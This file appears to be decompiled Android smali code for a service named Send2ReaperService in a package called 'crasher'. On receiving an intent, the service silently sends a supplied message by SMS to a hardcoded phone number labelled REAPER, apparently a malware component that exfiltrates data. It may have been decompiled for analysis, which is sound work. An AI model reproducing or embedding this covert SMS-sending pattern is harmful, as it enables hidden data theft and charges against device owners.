.class public Lcom/bigeye/crasher/Send2ReaperService;
.super Landroid/app/IntentService;
.source "Send2ReaperService.java"


# instance fields
.field public APP_TAG:Ljava/lang/String;

.field public MSG:Ljava/lang/String;

.field public OPERATION:Ljava/lang/String;

.field public REAPER:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 19
    const-string v0, "SendSMSToReaper"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    .line 11
    const-string v0, ""

    iput-object v0, p0, Lcom/bigeye/crasher/Send2ReaperService;->OPERATION:Ljava/lang/String;

    .line 12
    const-string v0, ""

    iput-object v0, p0, Lcom/bigeye/crasher/Send2ReaperService;->MSG:Ljava/lang/String;

    .line 14
    const-string v0, "741106971"

    iput-object v0, p0, Lcom/bigeye/crasher/Send2ReaperService;->REAPER:Ljava/lang/String;

    .line 16
    const-string v0, "Send2ReaperService"

    iput-object v0, p0, Lcom/bigeye/crasher/Send2ReaperService;->APP_TAG:Ljava/lang/String;

    .line 20
    return-void
.end method


# virtual methods
.method public Send2Reaper()V
    .locals 6

    .prologue
    const/4 v2, 0x0

    .line 40
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 41
    .local v0, "sms":Landroid/telephony/SmsManager;
    iget-object v1, p0, Lcom/bigeye/crasher/Send2ReaperService;->REAPER:Ljava/lang/String;

    iget-object v3, p0, Lcom/bigeye/crasher/Send2ReaperService;->MSG:Ljava/lang/String;

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 43
    iget-object v1, p0, Lcom/bigeye/crasher/Send2ReaperService;->APP_TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Snd: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/bigeye/crasher/Send2ReaperService;->MSG:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 44
    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 2
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 25
    const-string v0, "OPERATION"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/bigeye/crasher/Send2ReaperService;->OPERATION:Ljava/lang/String;

    .line 26
    const-string v0, "MSG"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/bigeye/crasher/Send2ReaperService;->MSG:Ljava/lang/String;

    .line 28
    invoke-virtual {p0}, Lcom/bigeye/crasher/Send2ReaperService;->Send2Reaper()V

    .line 31
    iget-object v0, p0, Lcom/bigeye/crasher/Send2ReaperService;->APP_TAG:Ljava/lang/String;

    const-string v1, "Cool"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 32
    invoke-virtual {p0}, Lcom/bigeye/crasher/Send2ReaperService;->stopSelf()V

    .line 34
    return-void
.end method
